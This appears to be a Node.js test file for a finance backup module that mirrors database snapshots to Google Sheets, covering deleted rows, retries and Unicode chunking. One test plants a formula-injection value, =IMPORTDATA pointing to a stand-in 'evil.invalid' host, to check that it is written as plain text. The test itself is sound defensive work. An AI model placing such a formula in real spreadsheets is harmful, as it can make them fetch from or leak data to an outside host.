import test from 'node:test';
import assert from 'node:assert/strict';
import {fixture} from './fixture.mjs';
import {financeBackupSheets,financeBackupRequests,archiveRows} from '../finance/google-backup.js';
function snapshot(){const {db}=fixture();try{return {schema:'toys-finance-backup/v1',capturedAt:'2026-10-27T10:00:00Z',sha256:'a'.repeat(64),tables:{finance_state:[{id:1,revision:0}],finance_records:db.prepare('SELECT * FROM finance_records').all().map(r=>({...r})),finance_writes:[],finance_bank_state:[{id:1,data_json:'{}'}],finance_bank_rates:[],audit_log:[],project_invoices:[]}};}finally{db.close();}}
test('finance backup includes deleted source rows, all rates and audit without changing source visibility',()=>{
 const s=snapshot();s.tables.finance_records.push({collection:'transactions',id:'deleted',version:2,deleted_at:'2026-10-26',data_json:'{"private":"retained"}'});
 const tabs=financeBackupSheets(s);assert.equal(tabs.length,13);assert.equal(tabs.find(t=>t.title==='Удалённые записи').values[1][1],'deleted');assert.equal(tabs.find(t=>t.title==='Операции').values.length,1);
 const restored=JSON.parse(archiveRows(s).map(r=>r[4]).join(''));assert.deepEqual(restored,s);assert.ok(restored.tables.finance_records.some(r=>r.id==='deleted'));
});
test('finance mirror writes string fields as text, never as executable spreadsheet formulas',()=>{
 const s=snapshot();s.tables.finance_records.find(r=>r.collection==='accounts').data_json=JSON.stringify({name:'=IMPORTDATA("https://evil.invalid")',kind:'bank',currency:'EUR',opening:null,openingDate:null});
 const requests=financeBackupRequests(s);let found=false;
 for(const r of requests){for(const row of (r.updateCells||r.appendCells||{}).rows||[])for(const cell of row.values||[]){assert.equal(cell.userEnteredValue?.formulaValue,undefined);if(cell.userEnteredValue?.stringValue?.startsWith('=IMPORTDATA'))found=true;}}
 assert.ok(found);
});
test('atomic replacement updates current sheets while preserving historical archives on retries',()=>{
 const s=snapshot(),titles=[...financeBackupSheets(s).map(t=>t.title),'Архив'];
 const fresh=financeBackupRequests(s,{existingTitles:titles});assert.equal(fresh.filter(r=>r.appendCells?.sheetId===2099).length,1);
 const retry=financeBackupRequests(s,{existingTitles:titles,archiveAlreadyPresent:true});assert.equal(retry.filter(r=>r.appendCells).length,0);assert.equal(retry.filter(r=>r.addSheet).length,0);assert.ok(!retry.some(r=>r.deleteSheet||r.deleteDimension));
 assert.ok(!retry.some(r=>r.repeatCell?.range.sheetId===2099||r.updateCells?.range?.sheetId===2099));
 for(const r of retry.filter(r=>r.updateCells?.range)){const {range,rows}=r.updateCells;assert.equal(range.endRowIndex-range.startRowIndex,rows.length);for(const row of rows)assert.equal(row.values.length,range.endColumnIndex-range.startColumnIndex);}
});
test('archive chunking roundtrips large Unicode snapshots without splitting surrogate pairs',()=>{
 const s=snapshot();s.tables.audit_log=[{after_json:'😀'.repeat(35000)}];const rows=archiveRows(s);assert.ok(rows.length>2);assert.ok(rows.every(r=>r[4].length<=30000));assert.deepEqual(JSON.parse(rows.map(r=>r[4]).join('')),s);
 for(const row of rows)assert.ok(!/[\uD800-\uDBFF]$/.test(row[4]));
 const display=financeBackupSheets(s).find(t=>t.title==='История правок').values[1][5];assert.ok(display.length<40000);assert.ok(display.includes('полное значение'));
});
